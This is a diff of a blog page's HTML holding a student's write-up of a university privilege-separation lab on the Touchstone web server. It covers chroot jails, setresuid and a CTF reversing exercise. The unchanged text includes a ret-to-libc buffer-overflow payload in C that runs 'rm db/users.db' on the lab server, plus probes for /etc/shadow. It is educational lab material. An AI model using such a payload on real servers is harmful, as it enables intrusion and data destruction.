@@ -79,13 +79,13 @@
 
 
 
-<meta name="description" content="This is a experiment of Information Security, about 7 exercises in this blog. May be a lot mistakes here, if you find it, please contact me. This lab consists of three parts:  Lab 3 :  Privilege Separ">
+<meta name="description" content="This is a experiment of Information Security, about 7 exercises in this blog. May be a lot mistakes here, if you find it, please contact me. This lab consists of three parts: Lab 3 :  Privilege Separa">
 <meta name="keywords" content="系统安全">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Privilege Separation">
 <meta property="og:url" content="https://blog.lecury.cn/2015/11/21/Privilege-Separation/index.html">
 <meta property="og:site_name" content="Brains">
-<meta property="og:description" content="This is a experiment of Information Security, about 7 exercises in this blog. May be a lot mistakes here, if you find it, please contact me. This lab consists of three parts:  Lab 3 :  Privilege Separ">
+<meta property="og:description" content="This is a experiment of Information Security, about 7 exercises in this blog. May be a lot mistakes here, if you find it, please contact me. This lab consists of three parts: Lab 3 :  Privilege Separa">
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="https://blog.lecury.cn/images/Privilege-Separation/1.png">
 <meta property="og:image" content="https://blog.lecury.cn/images/Privilege-Separation/2.png">
@@ -102,7 +102,7 @@
 <meta property="og:updated_time" content="2019-04-05T07:47:52.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Privilege Separation">
-<meta name="twitter:description" content="This is a experiment of Information Security, about 7 exercises in this blog. May be a lot mistakes here, if you find it, please contact me. This lab consists of three parts:  Lab 3 :  Privilege Separ">
+<meta name="twitter:description" content="This is a experiment of Information Security, about 7 exercises in this blog. May be a lot mistakes here, if you find it, please contact me. This lab consists of three parts: Lab 3 :  Privilege Separa">
 <meta name="twitter:image" content="https://blog.lecury.cn/images/Privilege-Separation/1.png">
 
 
@@ -410,27 +410,27 @@
 
       
         <p>This is a experiment of Information Security, about 7 exercises in this blog. May be a lot mistakes here, if you find it, please contact me. This lab consists of three parts:</p>
-<h2 id="lab-3-privilege-separation"><a class="markdownIt-Anchor" href="#lab-3-privilege-separation"></a> <strong>Lab 3 :  Privilege Separation</strong></h2>
-<h3 id="lab-environment-setup"><a class="markdownIt-Anchor" href="#lab-environment-setup"></a> <strong>Lab Environment Setup</strong></h3>
+<h2 id="Lab-3-Privilege-Separation"><strong>Lab 3 :  Privilege Separation</strong></h2>
+<h3 id="Lab-Environment-Setup"><strong>Lab Environment Setup</strong></h3>
 <ul>
 <li>Platform : Ubuntu 12.04 ( 64 bits )</li>
 <li>Contents : <a href="http://219.219.220.220:8091/~csslab2015/lab3/lab3-privilege-separation.html" target="_blank">Privilege Separation</a></li>
 </ul>
-<h3 id="brief-introduction"><a class="markdownIt-Anchor" href="#brief-introduction"></a> <strong>Brief introduction</strong></h3>
+<h3 id="Brief-introduction"><strong>Brief introduction</strong></h3>
 <p>This lab consists of three parts:</p>
 <ul>
 <li>Part A: you will examine the architecture of the Touchstone web server. The Touchstone web server in this lab differs dramatically from those from lab 1 and 2, the current one is based on the idea of services;</li>
 <li>Part B: you will explore jail, by which you can constraint the service in some fake root directory; and</li>
 <li>Part C: you will privilege-separate the Touchstone web server by assigning each component appropriate privilege.</li>
 </ul>
-<h3 id="part-a-the-touchstone-web-server"><a class="markdownIt-Anchor" href="#part-a-the-touchstone-web-server"></a> <strong>Part A: The Touchstone Web Server</strong></h3>
-<h4 id="exercise-1"><a class="markdownIt-Anchor" href="#exercise-1"></a> <strong>Exercise 1.</strong></h4>
+<h3 id="Part-A-The-Touchstone-Web-Server"><strong>Part A: The Touchstone Web Server</strong></h3>
+<h4 id="Exercise-1"><strong>Exercise 1.</strong></h4>
 <p>In order to gain deeper understanding of the internal architecture of the Touchstone web server, let’s use gdb to debug the banksv service.First, launch the server:</p>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo ./touchstone</span><br></pre></td></tr></table></figure>
 <p>now use gdb to attach to the banksv service:</p>
 <p><img src="/images/Privilege-Separation/1.png" alt><br>
 <img src="/images/Privilege-Separation/2.png" alt></p>
-<h4 id="exercise-2"><a class="markdownIt-Anchor" href="#exercise-2"></a> <strong>Exercise 2.</strong></h4>
+<h4 id="Exercise-2"><strong>Exercise 2.</strong></h4>
 <p>Finally, you will write some code. Extend the current sqlite3 user table, to add more information. For instance, you can add time and IP address to the user table, so that when one user has logged in, the web page can display the last login time, the current login address, etc… You may want to read some <a href="http://blog.csdn.net/skywalker256/article/details/4556939" target="_blank" rel="noopener">sqlite3</a> documentations.</p>
 <p>In order to complete these functions, I made effort in two places. One is to pass the value of <code>client_addr</code>, the other is to modify the user’s database.</p>
 <p><strong>Firstly</strong>, we pass the value of <code>client_addr</code> to <code>httpd</code> process though by executing <code>write( disp_fds[1], inet_ntoa(client_addr), 50 )</code>. And in <code>httpd</code> process, as a hub, we receive this value. Then we send this value to <code>filesv</code> and <code>banksv</code> processes respectively according to <code>pipefd</code> descriptor. So that, we can process this address to the browser. Why we don’t send it to <code>filesv</code> and <code>banksv</code> directly ? It is just a pity that the server has shut down these descriptors before new client coming…</p>
@@ -441,13 +441,13 @@
 <p>Now re-do exercise 3 to visit the file /etc/passwd. If your chroot protection works, your browser will behave like this (leaking no sensitive information): As follows:<br>
 <img src="/images/Privilege-Separation/7.png" alt><br>
 The principle of this method is to exclude some important datas, and run in a restricted environment. For example, in <strong>chroot-setup.h</strong> file, we don’t copy some important files(<strong>passwd</strong>,<strong>shadow</strong>) to the <code>/jail/etc/</code>.</p>
-<h3 id="part-c-privilege-separation"><a class="markdownIt-Anchor" href="#part-c-privilege-separation"></a> <strong>Part C: Privilege Separation</strong></h3>
-<h4 id="exercise-5"><a class="markdownIt-Anchor" href="#exercise-5"></a> <strong>Exercise 5.</strong></h4>
+<h3 id="Part-C-Privilege-Separation"><strong>Part C: Privilege Separation</strong></h3>
+<h4 id="Exercise-5"><strong>Exercise 5.</strong></h4>
 <p>Modify your browser code to inject some shell code the server. Your shell code attack the httpd daemon and unlink the file /db/users.db. Using ret-to-libc attack can make this a little simpler.</p>
 <p>Just likes the <strong>[Lab2]</strong>, we can complete it in the same way. And then I will illustrate it detailed in a picture and attach my codes later…<br>
 <img src="/images/Privilege-Separation/8.png" alt></p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 1</span></span><br><span class="line">  req[<span class="number">1064</span>] = <span class="number">0x80</span>;        <span class="comment">// system's address</span></span><br><span class="line">  req[<span class="number">1065</span>] = <span class="number">0xfe</span>;</span><br><span class="line">  req[<span class="number">1066</span>] = <span class="number">0xe5</span>;</span><br><span class="line">  req[<span class="number">1067</span>] = <span class="number">0xf7</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  req[<span class="number">1068</span>] = <span class="number">0x60</span>;        <span class="comment">// exit's address</span></span><br><span class="line">  req[<span class="number">1069</span>] = <span class="number">0x3b</span>;</span><br><span class="line">  req[<span class="number">1070</span>] = <span class="number">0xe5</span>;</span><br><span class="line">  req[<span class="number">1071</span>] = <span class="number">0xf7</span>;</span><br><span class="line"></span><br><span class="line">  req[<span class="number">1072</span>] = <span class="number">0x88</span>;        <span class="comment">// arg's address</span></span><br><span class="line">  req[<span class="number">1073</span>] = <span class="number">0xd2</span>;</span><br><span class="line">  req[<span class="number">1074</span>] = <span class="number">0xff</span>;</span><br><span class="line">  req[<span class="number">1075</span>] = <span class="number">0xff</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 1</span></span><br><span class="line">  req[<span class="number">1076</span>] = <span class="number">0x72</span>;        <span class="comment">// 'rm d'</span></span><br><span class="line">  req[<span class="number">1077</span>] = <span class="number">0x6d</span>;</span><br><span class="line">  req[<span class="number">1078</span>] = <span class="number">0x09</span>;</span><br><span class="line">  req[<span class="number">1079</span>] = <span class="number">0x64</span>;</span><br><span class="line"></span><br><span class="line">  req[<span class="number">1080</span>] = <span class="number">0x62</span>;        <span class="comment">// 'b/us'</span></span><br><span class="line">  req[<span class="number">1081</span>] = <span class="number">0x2f</span>;</span><br><span class="line">  req[<span class="number">1082</span>] = <span class="number">0x75</span>;</span><br><span class="line">  req[<span class="number">1083</span>] = <span class="number">0x73</span>;</span><br><span class="line"></span><br><span class="line">  req[<span class="number">1084</span>] = <span class="number">0x65</span>;        <span class="comment">// 'ers.'</span></span><br><span class="line">  req[<span class="number">1085</span>] = <span class="number">0x72</span>;</span><br><span class="line">  req[<span class="number">1086</span>] = <span class="number">0x73</span>;</span><br><span class="line">  req[<span class="number">1087</span>] = <span class="number">0x2e</span>;</span><br><span class="line"></span><br><span class="line">  req[<span class="number">1088</span>] = <span class="number">0x64</span>;        <span class="comment">// 'db'</span></span><br><span class="line">  req[<span class="number">1089</span>] = <span class="number">0x62</span>;</span><br><span class="line">  req[<span class="number">1090</span>] = <span class="number">0x0</span>;</span><br><span class="line">  req[<span class="number">1091</span>] = <span class="string">' '</span>;         <span class="comment">// make the function call end ...</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>
-<h4 id="exercise-6"><a class="markdownIt-Anchor" href="#exercise-6"></a> <strong>Exercise 6.</strong></h4>
+<h4 id="Exercise-6"><strong>Exercise 6.</strong></h4>
 <p>Modify the function in the file <code>server.c</code> , to set up the user and group IDs properly when services are launched. Think carefully about how your code can set the user and group IDs by <code>setresuid()</code>、<code>setgroups()</code>、<code>setresgid()</code>.</p>
 <p>Set file and directory permissions to ensure that the static service cannot read the database files from the dynamic service, and vice versa. Try to modify the <a href="http://chroot-setup.sh" target="_blank" rel="noopener">chroot-setup.sh</a> to set the permission for different files.</p>
 <p>In order to bind port 80 for the touchstone program, we have to start this server as a root. However, in the server.c file, we use <code>fork</code> and <code>execve</code> to run the <code>filesv httpd banksv</code> programs, as a result, these new programs will own root privilege…It is too dangerous…</p>
@@ -462,10 +462,10 @@ The principle of this method is to exclude some important datas, and run in a re
 <p>When we construct a HTTP request likes ‘GET db/users.db’ or ‘GET /etc/shadow’, “FILE not existed” and ‘permissions deny’ errors will be returned. Just like this :<br>
 <img src="/images/Privilege-Separation/9.png" alt><br>
 <img src="/images/Privilege-Separation/10.png" alt></p>
-<h4 id="exercise-7"><a class="markdownIt-Anchor" href="#exercise-7"></a> <strong>Exercise 7.</strong></h4>
+<h4 id="Exercise-7"><strong>Exercise 7.</strong></h4>
 <p>Is it is possible to perform a buffer overflow attack as lab1? Why?</p>
 <p>Of course, it does. The <code>httpd filesv banksv</code> processes will call <code>getToken</code> function to parse HTTP requests, however, <code>getToken</code> is vulnerable and can be exploited easily. Privilege separation can deny some illegal requests rather than preventing these programs from Buffer Overflow Attack. So it is possible to perform a buffer overflow attack unless we fixed up this hole…</p>
-<h4 id="challenge-capture-the-flag"><a class="markdownIt-Anchor" href="#challenge-capture-the-flag"></a> <strong>Challenge! Capture The Flag!!!</strong></h4>
+<h4 id="Challenge-Capture-The-Flag"><strong>Challenge! Capture The Flag!!!</strong></h4>
 <p>Now we provide you a simple CTF game, download the file, and use what you can do to reverse it, finally you should find the flag.</p>
 <p>Also, we strip the <strong>[file]</strong> as what Mr.H did in the last class. So you may need use gdb to debug it. May following three commands is useful:</p>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(gdb)layout asm  </span><br><span class="line">(gdb)si  </span><br><span class="line">(gdb)finish</span><br></pre></td></tr></table></figure>
@@ -475,7 +475,7 @@ The principle of this method is to exclude some important datas, and run in a re
 <p>Then we begin to look for which function will refer this data.</p>
 <p><img src="/images/Privilege-Separation/12.png" alt></p>
 <p>The function named <strong>loc_8048500</strong> will use this data. After that, we should follow flow of this program’s execution, and try to find how can invoke this function. Fortunately, I make it. As shown in a picture, we can find it absolutely though by</p>
-<pre class="highlight"><code class>objdum -d reverse | grep 8048500
+<pre><code>objdum -d reverse | grep 8048500
 </code></pre>
 <p><img src="/images/Privilege-Separation/13.png" alt><br>
 That means when <strong>$ebp-12</strong> is not equal to <strong>$0</strong>, the function will be called. OK ! Let’s try it in GDB.</p>
@@ -614,7 +614,7 @@ An important note in the end:</p>
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">45</span>
+                  <span class="site-state-item-count">49</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -627,7 +627,7 @@ An important note in the end:</p>
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">38</span>
+                  <span class="site-state-item-count">45</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -676,7 +676,7 @@ An important note in the end:</p>
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#lab-3-privilege-separation"><span class="nav-number">1.</span> <span class="nav-text"> Lab 3 :  Privilege Separation</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#lab-environment-setup"><span class="nav-number">1.1.</span> <span class="nav-text"> Lab Environment Setup</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#brief-introduction"><span class="nav-number">1.2.</span> <span class="nav-text"> Brief introduction</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#part-a-the-touchstone-web-server"><span class="nav-number">1.3.</span> <span class="nav-text"> Part A: The Touchstone Web Server</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#exercise-1"><span class="nav-number">1.3.1.</span> <span class="nav-text"> Exercise 1.</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#exercise-2"><span class="nav-number">1.3.2.</span> <span class="nav-text"> Exercise 2.</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#part-c-privilege-separation"><span class="nav-number">1.4.</span> <span class="nav-text"> Part C: Privilege Separation</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#exercise-5"><span class="nav-number">1.4.1.</span> <span class="nav-text"> Exercise 5.</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#exercise-6"><span class="nav-number">1.4.2.</span> <span class="nav-text"> Exercise 6.</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#exercise-7"><span class="nav-number">1.4.3.</span> <span class="nav-text"> Exercise 7.</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#challenge-capture-the-flag"><span class="nav-number">1.4.4.</span> <span class="nav-text"> Challenge! Capture The Flag!!!</span></a></li></ol></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Lab-3-Privilege-Separation"><span class="nav-number">1.</span> <span class="nav-text">Lab 3 :  Privilege Separation</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Lab-Environment-Setup"><span class="nav-number">1.1.</span> <span class="nav-text">Lab Environment Setup</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Brief-introduction"><span class="nav-number">1.2.</span> <span class="nav-text">Brief introduction</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Part-A-The-Touchstone-Web-Server"><span class="nav-number">1.3.</span> <span class="nav-text">Part A: The Touchstone Web Server</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Exercise-1"><span class="nav-number">1.3.1.</span> <span class="nav-text">Exercise 1.</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Exercise-2"><span class="nav-number">1.3.2.</span> <span class="nav-text">Exercise 2.</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Part-C-Privilege-Separation"><span class="nav-number">1.4.</span> <span class="nav-text">Part C: Privilege Separation</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Exercise-5"><span class="nav-number">1.4.1.</span> <span class="nav-text">Exercise 5.</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Exercise-6"><span class="nav-number">1.4.2.</span> <span class="nav-text">Exercise 6.</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Exercise-7"><span class="nav-number">1.4.3.</span> <span class="nav-text">Exercise 7.</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Challenge-Capture-The-Flag"><span class="nav-number">1.4.4.</span> <span class="nav-text">Challenge! Capture The Flag!!!</span></a></li></ol></li></ol></li></ol></div>
             
 
           </div>
